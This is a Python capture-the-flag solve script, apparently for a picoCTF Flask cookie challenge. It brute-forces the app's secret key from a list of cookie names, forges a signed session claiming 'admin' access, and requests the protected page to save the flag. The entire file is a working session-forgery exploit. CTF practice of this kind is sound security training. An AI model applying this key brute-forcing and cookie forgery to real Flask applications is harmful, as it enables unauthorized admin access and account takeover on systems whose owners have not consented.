import flask
import hashlib
import requests

from sys import argv
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

cookie = argv[1]
host = 'mercury.picoctf.net:44693'

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app_secret = ''

for name in cookie_names:

    try:
        serializer = URLSafeTimedSerializer(
        secret_key=name,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={
            'key_derivation' : 'hmac',
            'digest_method' : hashlib.sha1
        }).loads(cookie)
    except BadSignature:
        continue

    app_secret = name
    print(f'Flask App Secret: {app_secret}')


session = {'very_auth' : 'admin'}

session_cookie = URLSafeTimedSerializer(
    secret_key=app_secret,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation' : 'hmac',
        'digest_method' : hashlib.sha1
    }
).dumps(session)

response = requests.get('http://' + host + '/display', headers={
    'Cookie': 'session=' + session_cookie
})

with open('flag.html', 'w') as file:
    file.write(response.text)
